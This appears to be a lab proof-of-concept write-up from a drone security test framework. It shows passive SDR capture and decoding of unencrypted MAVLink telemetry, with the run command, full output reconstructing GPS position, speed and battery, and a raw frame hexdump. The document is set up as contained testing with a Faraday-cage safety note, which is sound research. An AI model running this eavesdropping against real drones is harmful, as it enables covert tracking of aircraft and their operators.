# PoC 02 — Telemetry eavesdropping (over-the-air)

**PWNUAV stages:** IA-01 (passive capture) · PA-01 (demodulation) · IM-04 (exfiltration)
**Mode:** RF / over-the-air · **venv:** `.venv-radio`

## What it demonstrates
The link runs in the clear: by listening to the downlink you reconstruct the full "flight picture" — position, velocity, GPS, attitude, VFR and battery — without any key.

## How it works
1. The drone emits its telemetry cycle; the **Pluto** transmits it (GFSK 915 MHz).
2. The **RTL-SDR** captures ~2.5 s; it is demodulated and parsed with pymavlink.
3. It counts the breakdown by message type (PA-01) and decodes the fields of GLOBAL_POSITION_INT, GPS_RAW_INT, ATTITUDE, VFR_HUD and SYS_STATUS → the flight picture (IM-04). Includes a hexdump of a raw GLOBAL_POSITION_INT.

## Command (input)
```
$ python attacks/02-eavesdrop/eavesdrop_aire.py
```

## Real output
```
========== PWNUAV EAVESDROP — cleartext telemetry ==========
[*] SDR RX: RTL-SDR @ 915 MHz  ;  victim: Pluto TX MAVLink (no crypto)
[IA-01] Passive capture 2.5 s — 0 keys, 0 handshakes required ...
[*] 133 frames recovered from 2,590,368 IQ samples

[PA-01] MESSAGE BREAKDOWN
  ATTITUDE                 x22
  GLOBAL_POSITION_INT      x16
  GPS_RAW_INT              x6
  HEARTBEAT                x56
  SYS_STATUS               x3
  VFR_HUD                  x30

[IM-04] RECONSTRUCTED FLIGHT PICTURE  (all in the clear)
  Position : lat 37.774900  lon -122.419400  alt 100.0 m  (rel 50.0 m)
  Velocity : vx 1.20  vy -0.35  vz 0.05 m/s  ground 1.25 m/s  hdg 90.0 deg
  GPS      : fix 3 (GPS_FIX_TYPE_3D_FIX)  sats 11  eph 1.21
  Attitude : roll 0.7  pitch 1.2  yaw 90.0 deg
  VFR HUD  : airspeed 12.4  groundspeed 12.9 m/s  throttle 55%  climb 0.4 m/s
  Battery  : 12.0 V  18.0 A  75%
  Mode     : custom_mode 4  status MAV_STATE_ACTIVE

[*] SAMPLE GLOBAL_POSITION_INT — raw frame captured off the air
  0000  FD 1C 00 00 00 01 01 21 00 00 00 00 00 00 08 FE   .......!........
  0010  83 16 30 48 08 B7 A0 86 01 00 50 C3 00 00 78 00   ..0H......P...x.
  0020  DD FF 05 00 28 23 D2 55                           ....(#.U

[+] FULL MISSION TELEMETRY EXFILTRATED — no credential, no key.
```

## Interpretation
- **Message breakdown:** how many of each type were recovered off the air.
- **Flight picture:** exact GPS position, velocity/heading, attitude in degrees, fix/sats, throttle, and battery (V/A/%). All **unencrypted** → zero confidentiality.

## Safety
The drone transmits: ONLY in a Faraday cage, or wired with attenuators.
